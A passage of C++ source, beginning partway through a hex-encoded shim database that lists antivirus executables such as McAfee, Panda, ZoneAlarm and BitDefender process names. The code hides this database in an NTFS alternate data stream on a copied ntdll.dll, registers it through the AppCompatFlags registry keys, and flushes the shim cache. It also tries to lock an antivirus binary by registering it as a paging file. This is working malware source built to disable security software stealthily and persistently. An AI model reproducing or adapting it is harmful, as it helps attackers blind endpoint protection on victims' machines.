x00\x00\x00\x01\x88\x0a\x00\x00\x00\x66\x00\x73\x00\x63\x00\x32\x00\x00\x00\x01\x88\x18\x00\x00\x00\x6d\x00\x63\x00\x61\x00\x67\x00\x65\x00\x6e\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6d\x00\x31\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6d\x00\x63\x00\x31\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x6d\x00\x63\x00\x73\x00\x68\x00\x69\x00\x65\x00\x6c\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6d\x00\x32\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6d\x00\x63\x00\x32\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x6d\x00\x63\x00\x73\x00\x76\x00\x68\x00\x6f\x00\x73\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6d\x00\x35\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6d\x00\x63\x00\x35\x00\x00\x00\x01\x88\x18\x00\x00\x00\x6d\x00\x66\x00\x65\x00\x66\x00\x69\x00\x72\x00\x65\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6d\x00\x33\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6d\x00\x63\x00\x33\x00\x00\x00\x01\x88\x18\x00\x00\x00\x6d\x00\x66\x00\x65\x00\x76\x00\x74\x00\x70\x00\x73\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x6d\x00\x34\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6d\x00\x63\x00\x34\x00\x00\x00\x01\x88\x16\x00\x00\x00\x6f\x00\x70\x00\x5f\x00\x6d\x00\x6f\x00\x6e\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x6f\x00\x75\x00\x74\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x6f\x00\x75\x00\x74\x00\x31\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x50\x00\x61\x00\x76\x00\x46\x00\x6e\x00\x53\x00\x76\x00\x72\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x32\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x32\x00\x00\x00\x01\x88\x1a\x00\x00\x00\x50\x00\x61\x00\x76\x00\x50\x00\x72\x00\x53\x00\x72\x00\x76\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x33\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x33\x00\x00\x00\x01\x88\x1c\x00\x00\x00\x70\x00\x61\x00\x76\x00\x73\x00\x72\x00\x76\x00\x78\x00\x38\x00\x36\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x34\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x34\x00\x00\x00\x01\x88\x18\x00\x00\x00\x50\x00\x73\x00\x43\x00\x74\x00\x72\x00\x6c\x00"
				   "\x53\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x35\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x35\x00\x00\x00\x01\x88\x16\x00\x00\x00\x50\x00\x53\x00\x48\x00\x6f\x00\x73\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x36\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x36\x00\x00\x00\x01\x88\x18\x00\x00\x00\x50\x00\x73\x00\x49\x00\x6d\x00\x53\x00\x76\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x37\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x37\x00\x00\x00\x01\x88\x16\x00\x00\x00\x70\x00\x73\x00\x6b\x00\x73\x00\x76\x00\x63\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x70\x00\x31\x00\x00\x00\x01\x88\x08\x00\x00\x00\x70\x00\x61\x00\x31\x00\x00\x00\x01\x88\x20\x00\x00\x00\x73\x00\x70\x00\x69\x00\x64\x00\x65\x00\x72\x00\x61\x00\x67\x00\x65\x00\x6e\x00\x74\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x08\x00\x00\x00\x64\x00\x72\x00\x33\x00\x00\x00\x01\x88\x08\x00\x00\x00\x64\x00\x73\x00\x70\x00\x00\x00\x01\x88\x16\x00\x00\x00\x76\x00\x73\x00\x73\x00\x65\x00\x72\x00\x76\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x0a\x00\x00\x00\x62\x00\x69\x00\x74\x00\x32\x00\x00\x00\x01\x88\x0c\x00\x00\x00\x62\x00\x69\x00\x74\x00\x64\x00\x32\x00\x00\x00\x01\x88\x16\x00\x00\x00\x7a\x00\x61\x00\x74\x00\x72\x00\x61\x00\x79\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x01\x88\x06\x00\x00\x00\x7a\x00\x61\x00\x00\x00\x01\x88\x08\x00\x00\x00\x7a\x00\x61\x00\x31\x00\x00\x00";
PSTR  apphelp_dll  =   "apphelp.dll";

typedef NTSTATUS (NTAPI* _NtCreatePagingFile)(IN PUNICODE_STRING PageFileName, 
											  IN PLARGE_INTEGER MiniumSize, 
											  IN PLARGE_INTEGER MaxiumSize, 
											  OUT PLARGE_INTEGER ActualSize OPTIONAL );
typedef NTSTATUS (NTAPI*  RtlStringFromGUID_)(
											  IN   void* Guid,
											  OUT PUNICODE_STRING GuidString );
typedef int    (* wcscat_)			(LPCTSTR,LPCTSTR);

UNICODE_STRING guid_string;

  //Apphelp Api :)
	SdbRegisterDatabaseEx_ SdbRegisterDatabaseEx;
	SdbOpenDatabase_	   SdbOpenDatabase;	 
	SdbFindFirstTag_	   SdbFindFirstTag;
	SdbGetStringTagPtr_	   SdbGetStringTagPtr;
	SdbFindNextTag_		   SdbFindNextTag;
	SdbReadBinaryTag_      SdbReadBinaryTag;
	SdbCloseDatabase_      SdbCloseDatabase;
	ShimFlushCache_		   ShimFlushCache;
  ////////////////////////////////////////////////
	RtlStringFromGUID_ RtlStringFromGUID;
	wcscat_			       wcscat_api;

char mas_guid [0x10];

bool PageLock (std::wstring av_image_path)
{
	bool result_=false;
	UNICODE_STRING uni1;
	_NtCreatePagingFile NtCreatePagingFile;
	LARGE_INTEGER lrg1_={0};
	LARGE_INTEGER lrg2_={0};
	//Init minimal size pgfile
	lrg1_.LowPart=0x02000000;
	lrg2_.LowPart=0x05000000;
	NtCreatePagingFile=(_NtCreatePagingFile)GetLibraryProcAddress("ntdll.dll","NtCreatePagingFile");
	if (NtCreatePagingFile!=NULL)
	{
		RtlInitUnicodeString( &uni1,av_image_path.c_str());
		if (NT_SUCCESS(NtCreatePagingFile(&uni1,&lrg1_,&lrg2_,0x0)))
			result_=true;
	}
	return result_;
}

bool ShimEngineLock (void)
{
	UNICODE_STRING		 unicode_str1;
	OBJECT_ATTRIBUTES    obj_attr;
	IO_STATUS_BLOCK io1;
	IO_STATUS_BLOCK write1;
	HANDLE sdb_base_handle;
	bool result_=false;

	std::wstring windows_directory;
	std::wstring windows_directory2;
	std::wstring ntdll_stream = L"\\systemroot\\ntdll.dll:29a";

	windows_directory.resize(0);
	windows_directory2.resize(0);
	DWORD size_buffer=GetWindowsDirectoryW((LPWSTR)windows_directory.c_str(),0);
	if (size_buffer==NULL)
		return false;
	
	windows_directory.resize(size_buffer);
	windows_directory2.resize(size_buffer);
	if(GetWindowsDirectoryW((LPWSTR)windows_directory.c_str(),size_buffer)
	   && GetWindowsDirectoryW((LPWSTR)windows_directory2.c_str(),size_buffer))
	{
		size_buffer=size_buffer-1;
		windows_directory.resize(size_buffer);
		windows_directory2.resize(size_buffer);

		windows_directory=windows_directory+L"\\system32\\ntdll.dll";
		windows_directory2=windows_directory2+L"\\ntdll.dll";
		if(CopyFileW((LPCTSTR)windows_directory.c_str(),(LPCTSTR)windows_directory2.c_str(),FALSE))
		{
			RtlInitUnicodeString( &unicode_str1,(PCWSTR)ntdll_stream.c_str() );
			InitializeObjectAttributes( &obj_attr, &unicode_str1, OBJ_CASE_INSENSITIVE, NULL, NULL );
			//Drop sdb base to stream
			if(NT_SUCCESS(NtCreateFile(&sdb_base_handle,FILE_GENERIC_WRITE,&obj_attr,&io1,
									   NULL,NULL,NULL,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,NULL)))
			{
				if(NT_SUCCESS(NtWriteFile(sdb_base_handle,NULL,NULL,NULL,&write1,sdb_base,sizeof(sdb_base),NULL,NULL)))
				{
					NtClose(sdb_base_handle);
					windows_directory2=windows_directory2+L":29a";
					//Install sdb_base
					result_=WrapInstallDb(windows_directory2);
				}
				else
				{
					NtClose(sdb_base_handle);
				}
			}
		}
	}

	return result_;
}
bool WrapInstallDb(std::wstring sdb_base_path)
{
	HKEY handleReg;
 	bool result_=false;
	DWORD des_acc_flags = KEY_ALL_ACCESS;

	if (IsWow64()==true)
		des_acc_flags= des_acc_flags | KEY_WOW64_64KEY;

	if(RegOpenKeyExW(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows NT\\CurrentVersion",0,des_acc_flags,&handleReg)==ERROR_SUCCESS)
	{
		result_=InstallDbProc(sdb_base_path,handleReg,L"AppCompatFlags\\Custom",L"AppCompatFlags\\InstalledSDB");
		RegCloseKey(handleReg);
	}
	return result_;
}

bool InstallDbProc(std::wstring sdb_base_path,HKEY hkeyPath1,LPCTSTR subkeyPath1,LPCTSTR subkeyPath2)
{
	HANDLE   heap_1;
	FILETIME ftime;
	HKEY hkeyInstalled,hkeyCustom;
	DWORD keyExist;
	PDB struct_sdb1;
	TAGID rootTag,tagId2,tagId3,tagIdCLSID;
	
	LPVOID heap_addr0;
	LPTSTR string1;
	bool  result_=false;

	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);  // Get handle to standard output
	if (hConsole==NULL)
	{
		std::cout<<"[-] Error in GetStdHandle function"<<std::endl;
		return false;
	}
	heap_1=Heap_init();
	if (heap_1==0)
		return false;
	heap_addr0=HeapAlloc(heap_1,HEAP_ZERO_MEMORY,MAX_PATH+MAX_PATH);
	if (heap_addr0==NULL)
		return false;
	if(LoadLibraryA(apphelp_dll)==NULL)
		return false;
	memset(&mas_guid,0,0x10);
	//lame :D
	SdbRegisterDatabaseEx=(SdbRegisterDatabaseEx_)GetLibraryProcAddress(apphelp_dll,"SdbRegisterDatabaseEx");
	SdbOpenDatabase=(SdbOpenDatabase_)GetLibraryProcAddress(apphelp_dll,"SdbOpenDatabase");
	SdbFindFirstTag=(SdbFindFirstTag_)GetLibraryProcAddress(apphelp_dll,"SdbFindFirstTag");
	SdbGetStringTagPtr=(SdbGetStringTagPtr_)GetLibraryProcAddress(apphelp_dll,"SdbGetStringTagPtr");
	SdbFindNextTag=(SdbFindNextTag_)GetLibraryProcAddress(apphelp_dll,"SdbFindNextTag");
	SdbReadBinaryTag=(SdbReadBinaryTag_)GetLibraryProcAddress(apphelp_dll,"SdbReadBinaryTag");
	SdbCloseDatabase=(SdbCloseDatabase_)GetLibraryProcAddress(apphelp_dll,"SdbCloseDatabase");
	ShimFlushCache=(ShimFlushCache_)GetLibraryProcAddress(apphelp_dll,"ShimFlushCache");
	RtlStringFromGUID=(RtlStringFromGUID_)GetLibraryProcAddress("ntdll.dll","RtlStringFromGUID");
	wcscat_api = (wcscat_) GetLibraryProcAddress("ntdll.dll","wcscat");
	if (!SdbRegisterDatabaseEx || !SdbOpenDatabase || !SdbFindFirstTag || !SdbGetStringTagPtr || !SdbFindNextTag
		|| !SdbReadBinaryTag || !SdbCloseDatabase || !ShimFlushCache || !RtlStringFromGUID || !wcscat_api)
		return false;
	GetSystemTimeAsFileTime(&ftime);
	//Create  AppCompatFlags\\Custom && AppCompatFlags\\InstalledSDB
	if (RegCreateKeyExW(hkeyPath1,subkeyPath1,0,0,0,0xF003F,0,&hkeyCustom,&keyExist)==ERROR_SUCCESS)
	{
		if (RegCreateKeyExW(hkeyPath1,subkeyPath2,0,0,0,0xF003F,0,&hkeyInstalled,&keyExist)==ERROR_SUCCESS)
		{
			struct_sdb1=SdbOpenDatabase(sdb_base_path.c_str(),DOS_PATH);
			if (struct_sdb1!=NULL)
			{
				rootTag=SdbFindFirstTag(struct_sdb1,0,APPHELP_TAG_DATABASE);
				if (rootTag!=NULL)
				{
					tagIdCLSID=SdbFindFirstTag(struct_sdb1,rootTag,APPHELP_TAG_DATABASE_ID);
					if (tagIdCLSID!=NULL)
					{
						if(SdbReadBinaryTag(struct_sdb1,tagIdCLSID,(PBYTE)&mas_guid,0x10)!=false)
						{
							if (NT_SUCCESS(RtlStringFromGUID((PBYTE)&mas_guid,&guid_string)))
							{
								wcscat_api((LPCTSTR)heap_addr0,guid_string.Buffer);
								wcscat_api((LPCTSTR)heap_addr0,L".sdb");
								struct_sdb1=SdbOpenDatabase(sdb_base_path.c_str(),(PATH_TYPE)0);
								if (struct_sdb1!=NULL)
								{
									tagId2=SdbFindFirstTag(struct_sdb1,rootTag,APPHELP_TAG_EXE);
									if (tagId2!=NULL)
									{
										do
										{
											tagId3=SdbFindFirstTag(struct_sdb1,tagId2,APPHELP_TAG_NAME);
											if(tagId3!=NULL)
											{
												string1=SdbGetStringTagPtr(struct_sdb1,tagId3);
												if (string1!=NULL)
												{
													//
													if (RegInstall(hkeyCustom,string1,(LPCTSTR)heap_addr0,&ftime))
													{
														SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
														std::wcout <<"[+] Shim-reg information success written for process: "<<string1<<std::endl;
													}
													else
													{
														SetConsoleTextAttribute(hConsole, FOREGROUND_RED);
														std::wcout <<"[-] Shim-reg information not written for processs: "<<string1<<std::endl;
													}
												}
											}
											tagId2=SdbFindNextTag(struct_sdb1,rootTag,tagId2);
										}
										while(tagId2!=NULL);
										SdbCloseDatabase(struct_sdb1);
										if (SdbRegisterDatabaseEx(sdb_base_path.c_str(),0x10000,NULL)!=false)
										{
											if (ShimFlushCache(0,0,0,0)!=false)
												result_=true;
										}
									}
								}
								RtlFreeUnicodeString(&guid_string);
							}
						}
					}
				}
			}
			RegCloseKey(hkeyInstalled);
		}
		RegCloseKey(hkeyCustom);
	}
	return result_;

}

bool RegInstall(HKEY key,LPCTSTR name,LPCTSTR guid,LPFILETIME fileTime)
{
	HKEY hkeyName;
	DWORD keyExist;

	bool result_1=false;
	if (RegCreateKeyExW(key,name,0,0,0,0xF003F,0,&hkeyName,&keyExist)==ERROR_SUCCESS)
	{
		if (RegSetValueExW(hkeyName,guid,0,REG_QWORD,(BYTE*)fileTime,0x8)==ERROR_SUCCESS)
			result_1=true;
		RegCloseKey(hkeyName);
	}
	return result_1;
}